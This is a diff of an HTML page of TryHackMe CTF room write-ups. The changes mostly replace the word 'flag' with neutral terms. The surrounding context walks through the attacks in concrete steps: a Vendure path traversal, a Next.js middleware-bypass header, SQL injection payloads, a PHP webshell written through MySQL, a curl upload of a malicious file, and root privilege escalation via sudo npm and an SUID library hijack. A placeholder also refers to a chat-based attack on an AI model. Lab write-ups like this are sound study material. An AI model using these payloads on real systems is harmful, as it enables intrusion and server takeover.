@@ -338,7 +338,7 @@
         <section class="section wu-hero">
             <div class="container">
                 <span class="wu-eyebrow">
-                    <i class="fas fa-flag"></i> TryHackMe Writeup · Room 100%
+                    <i class="fas fa-terminal"></i> TryHackMe Writeup · Room 100%
                 </span>
                 <h1>Dehli Meetup CTF <span class="accent">Writeup</span></h1>
                 <p class="subtitle">TryHackMe x EHAX workshop at DTU · 2026-10-13</p>
@@ -500,7 +500,7 @@
                     <div class="task-body">
 
                     <h4>What I was looking at</h4>
-                    <p>The target was a Vendure 3.0.4 storefront. Express sat on port 80 and reverse-proxied <code>/assets/*</code> to a Vendure instance on port 3001 via <code>http-proxy-middleware</code>. The flag lived at <code>/flag.txt</code> on the Vendure container, one directory above its asset root.</p>
+                    <p>The target was a Vendure 3.0.4 storefront. Express sat on port 80 and reverse-proxied <code>/assets/*</code> to a Vendure instance on port 3001 via <code>http-proxy-middleware</code>. The target file lived at <code>/flag.txt</code> on the Vendure container, one directory above its asset root.</p>
 
                     <h4>The bug</h4>
                     <p>Vendure 3.0.4 ships <code>@vendure/asset-server-plugin</code> with <strong>CVE-2024-56357</strong>, a path-traversal in the asset handler. The handler joins the request path onto its asset root after URL-decoding, so encoded <code>../</code> sequences escape the root cleanly.</p>
@@ -532,10 +532,10 @@ Host: TARGET_IP</code></pre>
                         <h3>Gatepass</h3>
                     </summary>
                     <div class="task-body">
-                    <span class="box-ip">Target: Next.js 14.1.1 app on :80. Source bundle served at :8080/source.zip. Flag at /flag.txt on the server.</span>
+                    <span class="box-ip">Target: Next.js 14.1.1 app on :80. Source bundle served at :8080/source.zip. Target file: /flag.txt on the server.</span>
 
                     <h4>Recon from the source</h4>
-                    <p>The task hands you a source zip at <code>:8080/source.zip</code>. It drops a tiny Next.js project: one middleware, one API key helper, one login route, one file-read route. <code>package.json</code> pins <code>"next": "14.1.1"</code>, which is already a flag by itself (that version is vulnerable to <strong>CVE-2025-29927</strong>, the middleware subrequest bypass).</p>
+                    <p>The task hands you a source zip at <code>:8080/source.zip</code>. It drops a tiny Next.js project: one middleware, one API key helper, one login route, one file-read route. <code>package.json</code> pins <code>"next": "14.1.1"</code>, which is already a tell by itself (that version is vulnerable to <strong>CVE-2025-29927</strong>, the middleware subrequest bypass).</p>
 
                     <p>The middleware is the whole gate:</p>
                     <pre><code>// src/middleware.js
@@ -642,7 +642,7 @@ x-middleware-subrequest: middleware</code></pre>
                     </summary>
                     <div class="task-body">
                         <!-- TODO fill from own notes. -->
-                        <div class="pending-note">Writeup pending. Adding the traffic analysis path and the artefact that produced the flag.</div>
+                        <div class="pending-note">Writeup pending. Adding the traffic analysis path and the artefact that produced the answer.</div>
                     </div>
                 </details>
 
@@ -659,7 +659,7 @@ x-middleware-subrequest: middleware</code></pre>
                     <h4>Recon</h4>
                     <p>nmap gave me 22, 80 and 3000. Port 80 was Apache serving a dir listing with an empty <code>/api/bill/</code> folder and a phpMyAdmin 4.9.5 install (login-gated). Port 3000 was a Next.js dev build called <strong>HomeTel</strong>. The dev bundle leaked source paths like <code>/home/ubuntu/csportal/src/pages/{login,home}/index.js</code> and the API routes <code>/api/login</code>, <code>/api/bill</code>, <code>/api/logout</code>.</p>
 
-                    <h4>Web flag: SQLi in /api/bill</h4>
+                    <h4>Web: SQLi in /api/bill</h4>
                     <p>The home page's bill-lookup form POSTs <code>{"NumReference": "&lt;n&gt;"}</code> to <code>/api/bill</code>. The parameter goes straight into a numeric SQL expression without quotes or parameterisation, so no quote escape is needed.</p>
                     <pre><code>POST /api/bill
 {"NumReference":"0 UNION SELECT 1,2,3"}
@@ -677,11 +677,11 @@ x-middleware-subrequest: middleware</code></pre>
 =&gt; bill, flag, users
 
 {"NumReference":"0 UNION SELECT flag,2,3 FROM bill_app_db.flag"}
-=&gt; web flag text</code></pre>
+=&gt; row contents of bill_app_db.flag</code></pre>
 
                     <p>Side note on the login endpoint: <code>POST /api/login</code> returns the matching user row, but a classic <code>' OR '1'='1</code> hits an explicit "only guest login is allowed" branch that rejects multi-row responses. Dead end there. The bill endpoint is the real sink.</p>
 
-                    <h4>User flag: MySQL FILE to PHP webshell</h4>
+                    <h4>User: MySQL FILE to PHP webshell</h4>
                     <p>The DB session is <code>root@localhost</code>, has the <code>FILE</code> privilege, and <code>@@secure_file_priv</code> is empty. <code>LOAD_FILE</code> is restricted by AppArmor: <code>/etc/passwd</code> and <code>/etc/mysql/my.cnf</code> come back, but <code>/etc/ssh/sshd_config</code>, <code>/home/*</code> and <code>/proc/mounts</code> all return NULL. So direct disclosure is a dead end. Writes into <code>/var/www/html/</code> are allowed though, which is all I needed.</p>
                     <pre><code>POST /api/bill
 {"NumReference":"0 UNION SELECT UNHEX('3c3f70687020...'),2,3
@@ -691,7 +691,7 @@ x-middleware-subrequest: middleware</code></pre>
 =&gt; uid=33(www-data) gid=33(www-data) groups=33(www-data),119(mysql)</code></pre>
                     <p>From there, <code>find / -name user.txt 2&gt;/dev/null</code> surfaces <code>/var/www/user.txt</code> (owned by www-data, mode 644). The <code>.env</code> at <code>/home/ubuntu/csportal/.env</code> also leaks <code>MYSQL_PASSWORD=root@123</code> for the phpMyAdmin path if you want it.</p>
 
-                    <h4>Root flag: sudo npm, done the way modern npm wants</h4>
+                    <h4>Root: sudo npm, done the way modern npm wants</h4>
                     <p><code>sudo -l</code> as www-data returned:</p>
                     <pre><code>(root) NOPASSWD: /usr/bin/npm *</code></pre>
                     <p>The classic GTFOBins payload (a <code>preinstall</code> script in a crafted <code>package.json</code>) <strong>does not work on npm 8+</strong>. The npm wrapper deliberately drops privileges on lifecycle scripts to the directory owner (here, www-data), even with <code>--unsafe-perm</code>. I confirmed it with a probe: <code>id</code> inside <code>preinstall</code> returned <code>uid=33(www-data)</code>, not root.</p>
@@ -743,7 +743,7 @@ curl -X POST http://TARGET/dev/upload.php -F "file=@/tmp/mal"</code></pre>
                     <ul>
                         <li><code>uid=33(www-data)</code>, hostname <code>tryhackme-2404</code> (Ubuntu 24.04).</li>
                         <li>Two home directories (<code>/home/agent</code>, <code>/home/ubuntu</code>), both unreadable to www-data.</li>
-                        <li>The user flag isn't under <code>/home/*</code>. It sits at <strong><code>/opt/user.txt</code></strong>, world-readable.</li>
+                        <li>The user answer file isn't under <code>/home/*</code>. It sits at <strong><code>/opt/user.txt</code></strong>, world-readable.</li>
                     </ul>
 
                     <h4>SUID binary: /opt/agent/scanner</h4>
@@ -792,7 +792,7 @@ chmod 755 /opt/agent/libscan.so
 /opt/agent/scanner        # SUID loads the .so, constructor runs as root
 cat /tmp/root_pwn
 # =&gt; uid=0(root) gid=0(root) groups=0(root),33(www-data)
-# =&gt; root flag text</code></pre>
+# =&gt; contents of /root/root.txt</code></pre>
 
                     <p>I bundled all of that into a single msfvenom <code>CMD=</code> payload so one upload did everything.</p>
 
@@ -828,7 +828,7 @@ cat /tmp/root_pwn
                     </summary>
                     <div class="task-body">
                         <!-- TODO fill from own notes. -->
-                        <div class="pending-note">Writeup pending. Adding the model's authorised actions, the privilege the attack had to cross, and the exact chat turns that produced the flag.</div>
+                        <div class="pending-note">Writeup pending. Adding the model's authorised actions, the privilege the attack had to cross, and the exact chat turns that produced the answer.</div>
                     </div>
                 </details>
 
@@ -854,7 +854,7 @@ cat /tmp/root_pwn
                     </summary>
                     <div class="task-body">
                         <!-- TODO fill from own notes. Region = Europe (Ireland) required. -->
-                        <div class="pending-note">Writeup pending. Adding the exposed data source, the parsing that extracted the flag, and my solution script.</div>
+                        <div class="pending-note">Writeup pending. Adding the exposed data source, the parsing that extracted the answer, and my solution script.</div>
                     </div>
                 </details>
 
